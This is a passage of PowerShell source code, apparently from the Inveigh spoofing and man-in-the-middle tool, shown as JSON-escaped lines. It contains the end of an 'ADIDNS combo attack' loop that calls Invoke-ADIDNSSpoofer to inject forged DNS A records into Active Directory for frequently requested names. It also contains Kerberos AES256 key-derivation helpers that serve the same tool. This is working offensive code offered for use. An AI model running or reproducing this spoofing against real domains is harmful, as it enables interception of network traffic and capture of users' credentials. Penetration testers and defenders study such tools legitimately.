f(($RequestTable.$request | Sort-Object -Unique).Count -gt $Threshold)","            {","","                if(!$inveigh.ADIDNS_table.ContainsKey($request))","                {","                    $inveigh.ADIDNS_table.Add($request,\"\")","                }","                ","                if($Ignore -NotContains $request -and !$inveigh.ADIDNS_table.$request)","                {    ","                    Invoke-ADIDNSSpoofer -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $request -Partition $Partition -Type 'A' -TTL $TTL -Zone $Zone","                }","                elseif($Ignore -Contains $request)","                {","","                    if(!$inveigh.ADIDNS_table.$request)","                    {","                        $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $request\") \u003e $null","                        $inveigh.ADIDNS_table.$request = 3","                    }","","                }","","            }","            ","            Start-Sleep -m 10","        }","","    }","","}","","# Kerberos Functions ScriptBlock","$kerberos_functions_scriptblock = ","{","","    function Get-KerberosAES256BaseKey","    {","        param([String]$salt,[System.Security.SecureString]$password)","","        $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)","        $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)","        [Byte[]]$salt = [System.Text.Encoding]::UTF8.GetBytes($salt)","        [Byte[]]$password_cleartext = [System.Text.Encoding]::UTF8.GetBytes($password_cleartext)","        $constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4","        $PBKDF2 = New-Object Security.Cryptography.Rfc2898DeriveBytes($password_cleartext,$salt,4096)","        Remove-Variable password_cleartext","        $PBKDF2_key = $PBKDF2.GetBytes(32)","        $AES = New-Object \"System.Security.Cryptography.AesManaged\"","        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC","        $AES.Padding = [System.Security.Cryptography.PaddingMode]::None","        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00","        $AES.KeySize = 256","        $AES.Key = $PBKDF2_key","        $AES_encryptor = $AES.CreateEncryptor()","        $base_key_part_1 = $AES_encryptor.TransformFinalBlock($constant,0,$constant.Length)","        $base_key_part_2 = $AES_encryptor.TransformFinalBlock($base_key_part_1,0,$base_key_part_1.Length)","        $base_key = $base_key_part_1[0..15] + $base_key_part_2[0..15]","","        return $base_key","    }","","    function Get-KerberosAES256UsageKey","    {","        param([String]$key_type,[Int]$usage_number,[Byte[]]$base_key)","","        $padding = 0x00 * 16","","        if($key_type -eq 'checksum')","        {","            switch($usage_number) ","            {","                25 {[Byte[]]$usage_constant = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $padding}","            }","        }","        elseif($key_type -eq 'encrypt')","        {","","            switch($usage_number) ","            {","                1 {[Byte[]]$usage_constant = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $padding}","                2 {[Byte[]]$usage_constant = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $padding}","                3 {[Byte[]]$usage_constant = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $padding}","                4 {[Byte[]]$usage_constant = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $padding}","                7 {[Byte[]]$usage_constant = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x5